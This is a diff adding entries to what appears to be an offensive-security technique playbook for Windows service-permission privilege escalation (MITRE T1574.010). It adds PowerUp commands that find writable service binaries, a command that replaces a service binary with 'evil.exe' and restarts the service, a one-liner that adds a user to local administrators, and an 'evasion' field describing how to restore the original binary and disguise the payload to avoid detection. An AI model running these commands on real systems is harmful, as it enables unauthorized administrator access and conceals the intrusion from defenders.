@@ -93,6 +93,23 @@
     "sources": [
       "HTB M26",
       "MITRE T1574.010"
-    ]
-  }
+    ],
+    "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+  },
+  "variations": [
+    {
+      "label": "PowerUp auto-abuse",
+      "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find services with a writable binary",
+      "command": "Get-ModifiableServiceFile -Verbose"
+    },
+    {
+      "label": "Replace the binary + restart",
+      "command": "copy /y evil.exe '<service_binary_path>' ; sc stop <service> & sc start <service>"
+    }
+  ]
 }
